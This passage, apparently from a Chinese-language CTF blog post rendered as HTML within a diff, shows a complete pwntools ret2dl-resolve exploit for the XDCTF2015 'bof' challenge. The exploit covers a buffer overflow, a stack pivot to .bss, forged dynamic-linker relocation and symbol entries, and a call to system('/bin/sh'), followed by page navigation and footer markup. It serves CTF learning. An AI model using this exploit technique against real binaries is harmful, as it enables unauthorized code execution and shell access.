class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'bof'</span>)</span><br><span class="line">r = process(<span class="string">'./bof'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">readplt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">writeplt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line">stack_size = <span class="number">0x99c</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span> * offset</span><br><span class="line">payload += p32(readplt)</span><br><span class="line">payload += p32(<span class="number">0x08048649</span>) <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804864b</span>) <span class="comment">#pop ebp ; ret</span></span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">0x08048465</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"><span class="comment"># got</span></span><br><span class="line">fake_index = base_stage + <span class="number">20</span> - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">28</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr+align</span><br><span class="line">fake_sym_offset = (fake_sym_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">r_info = (fake_sym_offset &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_func_str_addr = fake_sym_addr+<span class="number">0x10</span>-dynstr</span><br><span class="line">fake_write_sym = p32(fake_func_str_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(plt0)</span><br><span class="line">payload += p32(fake_index)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment">#payload += p32(1)</span></span><br><span class="line">payload += p32(base_stage+<span class="number">80</span>)</span><br><span class="line"><span class="comment">#payload += p32(len(sh))</span></span><br><span class="line">payload += p32(write_got)</span><br><span class="line">payload += p32(r_info)</span><br><span class="line">payload += <span class="string">'a'</span> *align</span><br><span class="line">payload += p32(fake_func_str_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x12</span>)</span><br><span class="line">payload += <span class="string">"system\x00"</span></span><br><span class="line">payload += <span class="string">'a'</span> * (<span class="number">80</span>-len(payload))</span><br><span class="line">payload += sh +<span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">'a'</span> * (<span class="number">100</span>- len(payload))</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果</p>
+<p><img src="/img/ret2dl/success.png" alt="success"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/binary/" rel="tag"># binary</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/11/bypass-Canary/" rel="prev" title="bypass Canary">
+      <i class="fa fa-chevron-left"></i> bypass Canary
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ret2dl-What"><span class="nav-number">1.</span> <span class="nav-text">Ret2dl?What?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现环境"><span class="nav-number">2.</span> <span class="nav-text">复现环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Problem"><span class="nav-number">3.</span> <span class="nav-text">Problem</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#确定报错位置"><span class="nav-number">3.1.</span> <span class="nav-text">确定报错位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看源代码"><span class="nav-number">3.2.</span> <span class="nav-text">查看源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#详解"><span class="nav-number">3.3.</span> <span class="nav-text">详解</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ph4ntom</p>
+  <div class="site-description" itemprop="description">The wheel turns,nothing is ever new</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ph4ntom</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
